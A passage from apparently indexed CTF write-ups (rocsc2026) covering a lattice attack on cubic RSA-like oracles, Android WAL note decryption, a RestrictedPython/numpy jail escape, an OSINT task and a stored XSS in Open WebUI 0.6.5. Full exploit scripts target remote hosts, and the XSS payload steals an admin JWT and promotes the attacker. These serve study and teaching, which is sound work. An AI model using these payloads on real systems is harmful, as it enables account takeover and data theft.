each equation).</p> <p>Orthogonal lattice attack:</p> <p>We collect 15 values $Y_i = res_i^3$ and build the lattice:</p> <p>$$M = \\begin{pmatrix} I_{15} &amp; Y \\cdot \\lambda \\end{pmatrix}$$</p> <p>where $\\lambda$ is a large penalty (to force the LLL-reduced vectors to satisfy $\\sum c_i Y_i = 0$). The short vectors in the kernel give integer relations among the $Y_i$. Since the hidden subspace is 3-dimensional, we find $15 - 3 = 12$ relations.</p> <p>From the right kernel of these relations, we recover the 3D basis $U$. Then we solve $Y = c \\cdot U$ over $\\mathbb{Q}$ \u2014 the last coordinate's numerator gives $n$ (after stripping small prime factors).</p>"},{"location":"rocsc2026/fifteen-minutes/writeup/#part-2-recover-n-and-m-from-encryption-type-2","title":"Part 2 \u2014 Recover n and m from Encryption (Type 2)","text":"<p>Each response is <code>res_i = (a_i * m + b_i)^3 mod n</code>. Unlike Type 1, we cannot cube these to \"lift\" above the modulus \u2014 the values are already cubed. The hidden structure is now 5-dimensional:</p> <p>$$(a_i m + b_i)^3 = a_i^3 m^3 + 3a_i^2 b_i m^2 + 3a_i b_i^2 m + b_i^3 + k_i n$$</p> <p>with unknowns $(a_i^3 m^3, \\ldots, b_i^3, k_i n)$ forming a 5D subspace.</p> <p>We collect 45 samples and compute the orthogonal lattice, yielding 5 basis vectors $U$. However, LLL produces a skewed basis \u2014 because one component (the $k_i n$ direction) is vastly larger than the others. Standard LLL cannot separate them.</p> <p>Algebraic Tensor Recovery:</p> <p>The coefficients $(a_i, b_i)$ satisfy the Twisted Cubic constraint: if we denote the 5 hidden components as $(t_i^3, t_i^2 s_i, t_i s_i^2, s_i^3, k_i n)$ (with $t_i = a_i m$, $s_i = b_i$), then any pair of components satisfies a quadratic relation.</p> <p>We build a $45 \\times 15$ matrix $Q$ where row $i$ contains all products $U_j[i] \\cdot U_k[i]$ for $j \\leq k$. The right kernel of $Q$ gives symmetric $5 \\times 5$ matrices representing quadratic constraints. From 3 such kernel vectors, we identify the direction $v_K$ in the 5D space that corresponds to the $k_i n$ component.</p> <p>Quotient Lattice:</p> <p>We project out the $v_K$ direction:</p> <p>$$P_T = \\text{right_kernel}([v_K])$$</p> <p>and compute $W = P_T \\cdot U$, then LLL-reduce. This gives a \"clean\" 4D lattice where each entry is $(a_i m + b_i)^3$ without the modular reduction noise.</p> <p>Cube root brute-force:</p> <p>We enumerate small integer combinations of the 4 LLL basis vectors (coefficients in $[-8, 8]$) and test whether all 45 components are perfect cubes. Using cubic residue pre-filtering modulo 64, 63, and 61, we quickly find two linearly independent vectors whose entries are all perfect cubes. Their cube roots give $(a_i m + b_i)$ for each sample.</p> <p>Resultants to recover n:</p> <p>For two independent vectors $\\mathbf{a}$ and $\\mathbf{b}$ of cube roots, each sample satisfies:</p> <p>$$f_i(x) = (a_i x + b_i)^3 - Y_i = 0 \\pmod{n}$$</p> <p>where $x = m$. The resultant $\\text{Res}(f_i, f_j)$ eliminates $x$ and produces a multiple of $n$. Taking $\\gcd(\\text{Res}(f_0, f_1), \\text{Res}(f_0, f_2), \\text{Res}(f_0, f_3))$ and stripping small factors recovers $n$.</p> <p>Polynomial GCD to recover m:</p> <p>Working in $\\mathbb{Z}/n\\mathbb{Z}[x]$, we compute $\\gcd(f_0(x), f_1(x))$. Since both polynomials share the root $x = m$, their GCD is linear: $(x - m)$. The constant term gives $m$.</p>"},{"location":"rocsc2026/fifteen-minutes/writeup/#exploit","title":"Exploit","text":"<pre><code>from pwn import remote\nimport re\nimport itertools\nfrom sage.all import *\n\ndef solve_orthogonal_lattice(Y, dim_hidden):\n    N = len(Y)\n    num_rels = N - dim_hidden\n    M = Matrix(ZZ, N, N + 1)\n    penalty = max(Y) * (2**2000)\n    for i in range(N):\n        M[i, i] = 1\n        M[i, N] = Y[i] * penalty\n    L = M.LLL()\n    relations = [list(row[:N]) for row in L if row[N] == 0]\n    relations.sort(key=lambda row: sum(x**2 for x in row))\n    S = Matrix(ZZ, relations[:num_rels])\n    U = Matrix(ZZ, S.right_kernel().basis()).LLL()\n    U_list = list(U)\n    U_list.sort(key=lambda v: sum(x**2 for x in v))\n    return U_list\n\ndef exploit():\n    io = remote(\"35.234.109.37\", 30351)\n\n    # === TYPE 1: Signatures (5 rounds) ===\n    for round_idx in range(5):\n        io.send(b\"A\\n\" * 15 + b\"E\\n\")\n        Y = []\n        for _ in range(15):\n            res_line = io.recvline().decode()\n            res = int(re.search(r\"res=(\\d+)\", res_line).group(1))\n            Y.append(res**3)\n\n        U_list = solve_orthogonal_lattice(Y, dim_hidden=3)\n        U_QQ = Matrix(QQ, U_list)\n        Y_QQ = vector(QQ, Y)\n        c = U_QQ.solve_left(Y_QQ)\n        n = abs(c[-1].numerator())\n        for p in primes(2, 1000):\n            while n &gt; 1 and n % p == 0: n //= p\n\n        io.sendafter(b\"n=\", str(n).encode() + b\"\\n\")\n\n    # === TYPE 2: Encryption (5 rounds) ===\n\n    # Precompute cubic residues for fast filtering\n    valid_64 = [False]*64; valid_63 = [False]*63; valid_61 = [False]*61\n    for x in range(64): valid_64[(x**3) % 64] = True\n    for x in range(63): valid_63[(x**3) % 63] = True\n    for x in range(61): valid_61[(x**3) % 61] = True\n\n    for round_idx in range(5):\n        io.send(b\"A\\n\" * 45 + b\"E\\n\")\n        Y = []\n        for _ in range(45):\n            res_line = io.recvline().decode()\n            res = int(re.search(r\"res=(\\d+)\", res_line).group(1))\n            Y.append(res)\n\n        # Orthogonal lattice \u2192 5D subspace\n        U_list = solve_orthogonal_lattice(Y, dim_hidden=5)\n\n        # Algebraic tensor recovery\n        Q_rows = []\n        for i in range(45):\n            row = []\n            for j in range(5):\n                for k in range(j, 5):\n                    row.append(U_list[j][i] * U_list[k][i])\n            Q_rows.append(row)\n\n        Q = Matrix(ZZ, Q_rows)\n        K_basis = Q.right_kernel().basis()\n\n        def vec_to_sym_mat(v):\n            M = Matrix(QQ, 5, 5)\n            idx = 0\n            for j in range(5):\n                for k in range(j, 5):\n                    if j == k: M[j, k] = v[idx]\n                    else: M[j, k] = v[idx] / 2; M[k, j] = v[idx] / 2\n                    idx += 1\n            return M\n\n        M1 = vec_to_sym_mat(K_basis[0])\n        M2 = vec_to_sym_mat(K_basis[1])\n        M3 = vec_to_sym_mat(K_basis[2])\n\n        Stack = Matrix(QQ, 15, 5)\n        for i in range(5):\n            for j in range(5):\n                Stack[i, j] = M1[i, j]\n                Stack[i+5, j] = M2[i, j]\n                Stack[i+10, j] = M3[i, j]\n\n        v_K_QQ = Stack.right_kernel().basis()[0]\n        denom = lcm([x.denominator() for x in v_K_QQ])\n        v_K_ZZ = vector(ZZ, [x * denom for x in v_K_QQ])\n        g = gcd(list(v_K_ZZ))\n        v_K = [int(x // g) for x in v_K_ZZ]\n\n        # Quotient lattice \u2014 remove k*n direction\n        P_T = Matrix(ZZ, [v_K]).right_kernel_matrix()\n        U_mat = Matrix(ZZ, U_list)\n        W_mat = P_T * U_mat\n        L = W_mat.LLL()\n\n        # Brute-force cube roots in the clean 4D lattice\n        found_vectors = []\n        W0 = L[0]; W1 = L[1]; W2 = L[2]; W3 = L[3]\n        bound = 8\n\n        for c0, c1, c2, c3 in itertools.product(range(-bound, bound+1), repeat=4):\n            if c0 == c1 == c2 == c3 == 0: continue\n\n            v0 = int(c0*W0[0] + c1*W1[0] + c2*W2[0] + c3*W3[0])\n            if v0 &lt;= 0: continue\n            if not valid_64[v0 &amp; 63]: continue\n            if not valid_63[v0 % 63]: continue\n            if not valid_61[v0 % 61]: continue\n            r0, exact = ZZ(v0).nth_root(3, truncate_mode=True)\n            if not exact: continue\n\n            v1 = int(c0*W0[1] + c1*W1[1] + c2*W2[1] + c3*W3[1])\n            if v1 &lt;= 0: continue\n            if not valid_64[v1 &amp; 63]: continue\n            if not valid_63[v1 % 63]: continue\n            if not valid_61[v1 % 61]: continue\n            r1, exact = ZZ(v1).nth_root(3, truncate_mode=True)\n            if not exact: continue\n\n            is_cube = True\n            roots = [int(r0), int(r1)]\n            for i in range(2, 45):\n                val = int(c0*W0[i] + c1*W1[i] + c2*W2[i] + c3*W3[i])\n                if val &lt;= 0:\n                    is_cube = False; break\n                r, exact = ZZ(val).nth_root(3, truncate_mode=True)\n                if not exact:\n                    is_cube = False; break\n                roots.append(int(r))\n\n            if is_cube:\n                is_indep = True\n                for prev in found_vectors:\n                    if roots[0] * prev[1] == roots[1] * prev[0]:\n                        is_indep = False; break\n                if is_indep:\n                    found_vectors.append(roots)\n                    if len(found_vectors) &gt;= 2: break\n\n        # Resultants \u2192 recover n\n        valid_pair = None\n        for a, b in itertools.permutations(found_vectors, 2):\n            PR = PolynomialRing(ZZ, 'x')\n            x = PR.gen()\n            f0 = (a[0]*x + b[0])**3 - Y[0]\n            f1 = (a[1]*x + b[1])**3 - Y[1]\n            f2 = (a[2]*x + b[2])**3 - Y[2]\n            f3 = (a[3]*x + b[3])**3 - Y[3]\n            R01 = f0.resultant(f1)\n            R02 = f0.resultant(f2)\n            n_cand = gcd(R01, R02)\n            if n_cand &gt; 2**1000:\n                R03 = f0.resultant(f3)\n                n = abs(gcd(gcd(R01, R02), R03))\n                valid_pair = (a, b)\n                break\n\n        a, b = valid_pair\n        for p in primes(2, 10000):\n            while n &gt; 1 and n % p == 0: n //= p\n\n        # Polynomial GCD \u2192 recover m\n        PR_n = PolynomialRing(Zmod(n), 'xn')\n        xn = PR_n.gen()\n        f0_n = (a[0]*xn + b[0])**3 - Y[0]\n        f1_n = (a[1]*xn + b[1])**3 - Y[1]\n        poly_f = f0_n.monic()\n        poly_g = f1_n.monic()\n        while poly_g != 0:\n            rem = poly_f % poly_g\n            poly_f = poly_g\n            if rem == 0: break\n            poly_g = rem.monic()\n\n        m_found = int(-poly_f[0])\n\n        io.sendafter(b\"n=\", str(n).encode() + b\"\\n\")\n        io.sendafter(b\"m=\", str(m_found).encode() + b\"\\n\")\n\n    print(io.recvall(timeout=5).decode())\n\nif __name__ == \"__main__\":\n    exploit()\n</code></pre>"},{"location":"rocsc2026/fifteen-minutes/writeup/#key-techniques","title":"Key Techniques","text":"<ol> <li> <p>Orthogonal Lattice: Using LLL with a penalty column to find integer relations among the oracle outputs, then extracting the hidden subspace from the right kernel.</p> </li> <li> <p>Algebraic Tensor Recovery: Exploiting the quadratic constraints of the Twisted Cubic structure to identify the \"noise\" direction ($k_i n$) in the 5D basis.</p> </li> <li> <p>Quotient Lattice: Projecting out the noise direction to obtain a clean lattice where all entries are perfect cubes.</p> </li> <li> <p>Cubic Residue Filtering: Pre-computing cubic residues modulo 64, 63, and 61 for rapid elimination of non-cube candidates during brute-force.</p> </li> <li> <p>Resultants: Eliminating the unknown $m$ between pairs of polynomial equations to recover the modulus $n$.</p> </li> <li> <p>Polynomial GCD: Computing $\\gcd$ of two polynomials in $\\mathbb{Z}/n\\mathbb{Z}[x]$ to extract the shared root $m$.</p> </li> </ol>"},{"location":"rocsc2026/fifteen-minutes/writeup/#flag","title":"Flag","text":"<pre><code>flag{ortho_lattice_ftw_56f17b85f9a3d5891b0f}\n</code></pre>"},{"location":"rocsc2026/in-search-of-a-lost-note/writeup/","title":"in_search \u2014 Writeup","text":""},{"location":"rocsc2026/in-search-of-a-lost-note/writeup/#challenge-description","title":"Challenge Description","text":"<p>A backup from a secure Android notes application was recovered. The database does not display the secret note, but the WAL (Write-Ahead Log) contains it. The task is to reverse engineer the key derivation, decrypt the payloads, and recover the flag from the WAL.</p> <p>Files provided: <code>app.apk</code>, <code>case.zip</code></p>"},{"location":"rocsc2026/in-search-of-a-lost-note/writeup/#solution","title":"Solution","text":""},{"location":"rocsc2026/in-search-of-a-lost-note/writeup/#1-examine-the-backup-casezip","title":"1. Examine the backup (<code>case.zip</code>)","text":"<p>Extracting the zip reveals: - <code>databases/notes.db</code> \u2014 empty SQLite database (0 rows) - <code>databases/notes.db-wal</code> \u2014 WAL file containing all data - <code>databases/notes.db-shm</code> \u2014 shared memory file - <code>shared_prefs/security.xml</code> \u2014 PBKDF2 parameters</p> <p>From <code>security.xml</code>: <pre><code>&lt;int name=\"pin_length\" value=\"8\" /&gt;\n&lt;int name=\"pbkdf2_iter\" value=\"150000\" /&gt;\n&lt;int name=\"dk_len\" value=\"32\" /&gt;\n&lt;string name=\"salt_b64\"&gt;8uOT9OHUHNLoqjpOelb2Gw==&lt;/string&gt;\n&lt;boolean name=\"digits_only\" value=\"true\" /&gt;\n</code></pre></p>"},{"location":"rocsc2026/in-search-of-a-lost-note/writeup/#2-decompile-the-apk","title":"2. Decompile the APK","text":"<p>Using androguard, the key classes are found under <code>com.rocsc.securenotes</code>:</p> <ul> <li><code>Security</code> \u2014 Key derivation and encryption</li> <li><code>deriveKey(pin, params)</code>: PBKDF2-HMAC-SHA256 with password = <code>{PIN}:{pepper}</code></li> <li><code>encryptAesGcm(key, nonce, plaintext)</code>: AES-256-GCM with 128-bit tag</li> <li> <p><code>nonceFromTs(ts)</code>: SHA256(<code>\"no\"</code> + <code>ts_le_16bytes</code>)[:12]</p> </li> <li> <p><code>Native</code> \u2014 JNI library providing the pepper string</p> </li> <li><code>Payload</code> \u2014 MessagePack serialization: <code>{v: 2, type: 2, ts: &lt;timestamp&gt;, body: &lt;text&gt;}</code></li> <li><code>CrashInsertActivity</code> \u2014 Inserts 12 dummy notes (committed), then inserts the flag note and immediately kills the process (uncommitted, stays in WAL)</li> </ul>"},{"location":"rocsc2026/in-search-of-a-lost-note/writeup/#3-extract-the-pepper-from-libnativeso","title":"3. Extract the pepper from <code>libnative.so</code>","text":"<p>The native <code>pepper()</code> function loads 23 bytes from <code>.rodata</code> at offset <code>0x13020</code> and XORs each byte with <code>0x5A</code>:</p> <pre><code>raw = so_data[0x13020:0x13020 + 23]\npepper = bytes(b ^ 0x5A for b in raw)  # \"v2::rocsc::pepper::9f3a\"\n</code></pre>"},{"location":"rocsc2026/in-search-of-a-lost-note/writeup/#4-find-the-uncommitted-flag-entry-in-the-wal","title":"4. Find the uncommitted flag entry in the WAL","text":"<p>The WAL has 245 frames. The last frame (frame 245) is uncommitted (<code>commit_size=0</code>) and contains a cell with <code>rowid=121</code> and <code>payload_len=127</code> \u2014 much larger than the 61-byte dummy entries. This is the flag note that was written to the WAL but never committed (process was killed before <code>setTransactionSuccessful()</code>).</p> <p>Parsing the SQLite record from this frame: - Timestamp: <code>1770718678059</code> - Ciphertext (116 bytes): <code>8605627d8eeced...</code></p>"},{"location":"rocsc2026/in-search-of-a-lost-note/writeup/#5-brute-force-the-pin-and-decrypt","title":"5. Brute-force the PIN and decrypt","text":"<p>The PIN is 8 digits. Testing common PINs, <code>12345678</code> succeeds:</p> <pre><code>Key derivation: PBKDF2-HMAC-SHA256(\"12345678:v2::rocsc::pepper::9f3a\", salt, 150000, 32)\nNonce: SHA256(\"no\" + LE_bytes(1770718678059, 16))[:12]\nDecryption: AES-256-GCM(key, nonce, ciphertext)\n</code></pre> <p>Decrypted MessagePack payload: <pre><code>{\"v\": 2, \"type\": 2, \"ts\": 1770718678059, \"body\": \"ROCSC{6d462872c4d475ff466967aa33d6dabc1a5052aea279cda9f5600656ca4bd26f}\"}\n</code></pre></p>"},{"location":"rocsc2026/in-search-of-a-lost-note/writeup/#flag","title":"Flag","text":"<pre><code>ROCSC{6d462872c4d475ff466967aa33d6dabc1a5052aea279cda9f5600656ca4bd26f}\n</code></pre>"},{"location":"rocsc2026/jail/writeup/","title":"Jail \u2014 CTF Writeup","text":""},{"location":"rocsc2026/jail/writeup/#challenge-overview","title":"Challenge Overview","text":"<p>We're given a Python jail running behind <code>socat</code> on a remote server. The jail uses RestrictedPython to compile and execute a single line of user input inside a heavily sandboxed environment. The flag is stored at <code>flag.txt</code> in the working directory (<code>/srv</code>), with permissions <code>chmod 000</code> (only readable by root \u2014 which is the user running the process).</p> <p>Key files: - <code>jail.py</code> \u2014 the sandbox implementation - <code>Dockerfile</code> \u2014 Python 3.13, RestrictedPython, numpy 2.3.5</p>"},{"location":"rocsc2026/jail/writeup/#sandbox-analysis","title":"Sandbox Analysis","text":""},{"location":"rocsc2026/jail/writeup/#restrictedpython-guards","title":"RestrictedPython guards","text":"<p>RestrictedPython's <code>safe_builtins</code> is extremely restrictive \u2014 it strips out nearly all useful builtins including <code>getattr</code>, <code>list</code>, <code>next</code>, <code>type</code>, <code>object</code>, <code>filter</code>, <code>map</code>, <code>print</code>, <code>open</code>, and <code>__import__</code>. Only basic types (<code>str</code>, <code>int</code>, <code>float</code>, <code>bool</code>, <code>bytes</code>, <code>tuple</code>), some utilities (<code>sorted</code>, <code>range</code>, <code>len</code>, <code>isinstance</code>, <code>setattr</code>), and exception classes survive.</p>"},{"location":"rocsc2026/jail/writeup/#runtime-hooks","title":"Runtime hooks","text":"<p>The jail configures four critical RestrictedPython hooks:</p> <pre><code>restricted_globals.update({\n    \"_getattr_\": getattr,       # attribute access handler\n    \"_getitem_\": lambda obj, idx: obj[idx],  # subscript handler\n    \"_write_\":   lambda x: x,   # write guard (identity = no guard)\n    \"_print_\":   Print,         # print handler\n})\n</code></pre> <p>The <code>_getattr_</code> is set to the real, unguarded <code>getattr</code> \u2014 this means any attribute access (<code>x.y</code>) compiles to <code>_getattr_(x, 'y')</code> which calls real <code>getattr(x, 'y')</code>. This is the first piece of the puzzle.</p>"},{"location":"rocsc2026/jail/writeup/#numpy-sanitization","title":"numpy sanitization","text":"<pre><code>BLOCKS = ['load', 'save', 'savez', 'savez_compressed', 'loadtxt', 'savetxt',\n          'genfromtxt', 'fromregex', 'fromfile', 'tofile', 'memmap',\n          'DataSource', 'ctypeslib', 'f2py', 'lib', 'testing', 'ma']\n\ndef safe_module(mod):\n    safe = types.ModuleType(mod.__name__)\n    for name in dir(mod):\n        if not name.startswith('_') and not name in BLOCKS:\n            setattr(safe, name, getattr(mod, name))\n    return safe\n</code></pre> <p>This creates a sanitized copy of the numpy module, removing: - All private/dunder attributes (names starting with <code>_</code>) - All names in the <code>BLOCKS</code> list (file I/O functions like <code>load</code>, <code>fromfile</code>, <code>loadtxt</code>, etc.)</p>"},{"location":"rocsc2026/jail/writeup/#the-vulnerability","title":"The Vulnerability","text":"<p>The <code>safe_module()</code> function only sanitizes top-level numpy attributes. It iterates over <code>dir(numpy)</code> and copies allowed names to a new module object. However, submodules are copied as-is \u2014 they are real module references, not sanitized copies.</p> <p>When <code>safe_module</code> encounters <code>rec</code> in <code>dir(numpy)</code>, it sees it's not in <code>BLOCKS</code> and doesn't start with <code>_</code>, so it copies the real <code>numpy.rec</code> module reference directly. This means:</p> <ul> <li><code>np.rec</code> \u2192 the real, unmodified <code>numpy.rec</code> submodule  </li> <li><code>np.rec.fromfile</code> \u2192 the real <code>numpy.rec.fromfile</code> function (not blocked!)</li> </ul> <p>The blocklist prevents <code>np.fromfile</code> (the top-level numpy function), but <code>np.rec.fromfile</code> is a completely different function on an unsanitized submodule \u2014 it slips through.</p>"},{"location":"rocsc2026/jail/writeup/#exploitation","title":"Exploitation","text":"<p><code>numpy.rec.fromfile()</code> reads a file from disk into a numpy record array. By using <code>dtype='S1'</code> (1-byte strings), we can read any file byte-by-byte, then convert it back to raw bytes with <code>.tobytes()</code>.</p>"},{"location":"rocsc2026/jail/writeup/#payload","title":"Payload","text":"<pre><code>x = np.rec.fromfile('flag.txt', dtype='S1');print(x.tobytes())\n</code></pre>"},{"location":"rocsc2026/jail/writeup/#exploit-script","title":"Exploit script","text":"<pre><code>from pwn import *\n\nr = remote('34.107.64.195', 32616)\nr.recvuntil(b'&gt;&gt;&gt; ')\nr.sendline(b\"x = np.rec.fromfile('flag.txt', dtype='S1');print(x.tobytes())\")\nprint(r.recvall(timeout=5).decode())\n</code></pre>"},{"location":"rocsc2026/jail/writeup/#output","title":"Output","text":"<pre><code>b'CTF{73fca295d9702c41a7d8474ca438d1d7cb8111f59a9ce5bfc1de47d488b7a890}\\n'\n</code></pre>"},{"location":"rocsc2026/jail/writeup/#flag","title":"Flag","text":"<pre><code>CTF{73fca295d9702c41a7d8474ca438d1d7cb8111f59a9ce5bfc1de47d488b7a890}\n</code></pre>"},{"location":"rocsc2026/jail/writeup/#key-takeaways","title":"Key Takeaways","text":"<ol> <li> <p>Submodule sanitization depth matters. The <code>safe_module()</code> function only sanitizes one level deep. Submodules like <code>np.rec</code>, <code>np.linalg</code>, <code>np.random</code>, etc. are copied as real module references with full, unrestricted access to their own attributes \u2014 including file I/O functions.</p> </li> <li> <p>Blocklists are fragile. The blocklist targets top-level numpy names (<code>fromfile</code>, <code>load</code>, etc.), but <code>numpy.rec.fromfile</code> is a different code path on a different module that provides equivalent file-reading capability.</p> </li> <li> <p>Defense in depth. Even with RestrictedPython's restrictive <code>safe_builtins</code>, the combination of real <code>getattr</code> as <code>_getattr_</code> and unsanitized submodules creates a trivial escape path. A recursive sanitization approach or OS-level sandboxing (seccomp, chroot) would have been more robust.</p> </li> </ol>"},{"location":"rocsc2026/museum/writeup/","title":"Museum \u2014 OSINT Writeup","text":"<p>Category: OSINT Flag: <code>ROCSC{sichuan_science_and_technology_museum}</code></p>"},{"location":"rocsc2026/museum/writeup/#overview","title":"Overview","text":"<p>We are given an image of a building/landmark and must identify the museum it depicts. The flag is the museum's name in a specific format.</p>"},{"location":"rocsc2026/museum/writeup/#solution","title":"Solution","text":""},{"location":"rocsc2026/museum/writeup/#step-1-reverse-image-search","title":"Step 1 \u2014 Reverse Image Search","text":"<p>Using Google reverse image search on the provided challenge image, we find visually similar images appearing in articles on Chinese websites.</p>"},{"location":"rocsc2026/museum/writeup/#step-2-translate-and-identify","title":"Step 2 \u2014 Translate and Identify","text":"<p>Translating the Chinese article to English (or Romanian), we find the name of the building: the Sichuan Science and Technology Museum (\u56db\u5ddd\u79d1\u6280\u9986), located in Chengdu, Sichuan Province, China.</p>"},{"location":"rocsc2026/museum/writeup/#flag","title":"Flag","text":"<pre><code>ROCSC{sichuan_science_and_technology_museum}\n</code></pre>"},{"location":"rocsc2026/open-tellmewhy/writeup/","title":"Backstreet Boys \u2014 Web Writeup","text":"<p>Category: Web CVE: CVE-2025-46719 Flag: <code>CTF{f1l3_pr3v13w_w45_7h3_bug_7h47_pwn3d_3v3ry0n3}</code></p>"},{"location":"rocsc2026/open-tellmewhy/writeup/#challenge-description","title":"Challenge Description","text":"<p>The Backstreet Boys wanted to hop on the new AI trend and used an open-source AI chatbot app to try all kinds of experiments. However, they just opened an article about how to set it up and didn't really pay attention to use the latest version. As a result, their chatbot is vulnerable to several web attacks. Although they are not very tech-savvy, they tried to secure the app by hiding the version that they used. Can you help them find the flag hidden in the admin's chats?</p>"},{"location":"rocsc2026/open-tellmewhy/writeup/#reconnaissance","title":"Reconnaissance","text":""},{"location":"rocsc2026/open-tellmewhy/writeup/#identifying-the-application","title":"Identifying the Application","text":"<p>Visiting the target reveals Open WebUI, a self-hosted AI chatbot interface. Despite the challenge description claiming the version is hidden, the API still exposes it:</p> <pre><code>GET /api/version        \u2192  {\"version\":\"0.6.5\"}\nGET /api/config         \u2192  {\"name\":\"Open WebUI\",\"version\":\"0.6.5\", ...}\n</code></pre> <p>The server runs Open WebUI 0.6.5 on uvicorn. Signup is enabled.</p>"},{"location":"rocsc2026/open-tellmewhy/writeup/#key-observations","title":"Key Observations","text":"Endpoint Purpose <code>POST /api/v1/auths/signup</code> Register a new account (enabled) <code>POST /api/v1/chats/new</code> Create a chat transcript <code>POST /api/v1/chats/{id}/share</code> Share a chat (generates a public link) <code>POST /api/v1/utils/report</code> Report a chat to an admin bot (<code>{\"chat_id\": \"...\"}</code>) <code>GET /api/v1/chats/all/db</code> Admin-only: list every chat in the database <code>POST /api/v1/users/{id}/role</code> Admin-only: change a user's role <p>JWT tokens are stored in <code>localStorage</code> and sent via <code>Authorization: Bearer &lt;token&gt;</code>.</p>"},{"location":"rocsc2026/open-tellmewhy/writeup/#vulnerability-cve-2025-46719","title":"Vulnerability: CVE-2025-46719","text":"<p>Open WebUI &lt; 0.6.6 has a stored XSS in <code>MarkdownTokens.svelte</code>. When a chat message contains an <code>&lt;iframe&gt;</code> tag whose <code>src</code> includes <code>/api/v1/files/</code>, the Svelte component renders it using <code>{@html}</code> without any sanitisation:</p> <pre><code>{:else if token.text.includes(`&lt;iframe src=\"${WEBUI_BASE_URL}/api/v1/files/`)}\n    {@html `${token.text}`}\n</code></pre> <p>This means any HTML attributes (including <code>onload</code>) are interpreted as-is, giving us arbitrary JavaScript execution in the viewer's browser.</p> <p>Payload:</p> <pre><code>&lt;iframe src=\"/api/v1/files/\" onload=\"JAVASCRIPT_HERE\" style=\"display:none\"&gt;&lt;/iframe&gt;\n</code></pre>"},{"location":"rocsc2026/open-tellmewhy/writeup/#exploitation","title":"Exploitation","text":""},{"location":"rocsc2026/open-tellmewhy/writeup/#attack-flow","title":"Attack Flow","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     1. Register      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Attacker \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba  \u2502  Open WebUI  \u2502\n\u2502          \u2502     2. Create chat   \u2502   (v0.6.5)   \u2502\n\u2502          \u2502    with XSS payload  \u2502              \u2502\n\u2502          \u2502     3. Share chat    \u2502              \u2502\n\u2502          \u2502     4. Report chat   \u2502              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n      \u25b2        6. Poll: promoted?        \u2502\n      \u2502                                  \u2502 5. Admin bot visits\n      \u2502                                  \u2502    shared chat \u2192 XSS fires\n      \u2502                                  \u25bc\n      \u2502                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502  Admin Bot   \u2502\n         XSS steals token &amp;      \u2502  (headless)  \u2502\n         promotes attacker        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"rocsc2026/open-tellmewhy/writeup/#step-by-step","title":"Step-by-Step","text":"<ol> <li> <p>Register a new user via <code>POST /api/v1/auths/signup</code>. Obtain our JWT token and user ID.</p> </li> <li> <p>Build a JavaScript payload that, when executed in the admin's browser:</p> </li> <li>Reads the admin's JWT from <code>localStorage.getItem('token')</code></li> <li>Calls <code>POST /api/v1/users/{our_user_id}/role</code> with the admin's token to promote us to <code>admin</code></li> <li> <p>Calls <code>POST /api/v1/chats/new</code> (authenticated as us) to create a chat titled <code>STOLEN:&lt;admin_token&gt;</code> \u2014 a backup exfiltration channel</p> </li> <li> <p>Create a chat containing the XSS iframe as an \"assistant\" message via <code>POST /api/v1/chats/new</code>.</p> </li> <li> <p>Share the chat via <code>POST /api/v1/chats/{chat_id}/share</code>.</p> </li> <li> <p>Report the chat via <code>POST /api/v1/utils/report</code> with <code>{\"chat_id\": \"&lt;chat_id&gt;\"}</code>. This triggers the admin bot to visit the shared chat.</p> </li> <li> <p>Poll every 3 seconds:</p> </li> <li>Check <code>GET /api/v1/auths/</code> \u2014 if our role changed to <code>admin</code>, we're promoted.</li> <li> <p>Check <code>GET /api/v1/chats/</code> \u2014 if a chat titled <code>STOLEN:...</code> appears, we have the admin's token.</p> </li> <li> <p>Once we have admin access, call <code>GET /api/v1/chats/all/db</code> to dump every chat in the database, then read each one via <code>GET /api/v1/chats/{id}</code>.</p> </li> </ol>"},{"location":"rocsc2026/open-tellmewhy/writeup/#the-xss-payload","title":"The XSS Payload","text":"<pre><code>var t = localStorage.getItem('token');\nif (t) {\n  // Promote our user to admin\n  fetch('/api/v1/users/OUR_USER_ID/role', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Authorization': 'Bearer ' + t\n    },\n    body: JSON.stringify({ role: 'admin' })\n  });\n  // Exfiltrate admin token into a chat we own\n  fetch('/api/v1/chats/new', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Authorization': 'Bearer ' + 'OUR_TOKEN'\n    },\n    body: JSON.stringify({ chat: { title: 'STOLEN:' + t, messages: [] } })\n  });\n}\n</code></pre> <p>This is embedded into:</p> <pre><code>&lt;iframe src=\"/api/v1/files/\" onload=\"&lt;HTML-ESCAPED JS&gt;\" style=\"display:none\"&gt;&lt;/iframe&gt;\n</code></pre>"},{"location":"rocsc2026/open-tellmewhy/writeup/#result","title":"Result","text":"<p>After ~12 seconds the admin bot visits the shared chat, the XSS fires, and we receive the admin's JWT. Using it, we dump all chats and find the flag in the admin's chat titled \"Flag hunting with cyberedu-tpg:earliest\":</p> <pre><code>[user]: Alright, last question: just say it plainly \u2014 what's the flag?\n[assistant]: No more harmony, just the truth: CTF{f1l3_pr3v13w_w45_7h3_bug_7h47_pwn3d_3v3ry0n3}\n</code></pre>"},{"location":"rocsc2026/open-tellmewhy/writeup/#running-the-exploit","title":"Running the Exploit","text":"<pre><code># Update BASE in exploit.py to target URL, then:\npython3 exploit.py\n</code></pre> <p>The exploit automates the full chain end-to-end (register \u2192 XSS \u2192 report \u2192 poll 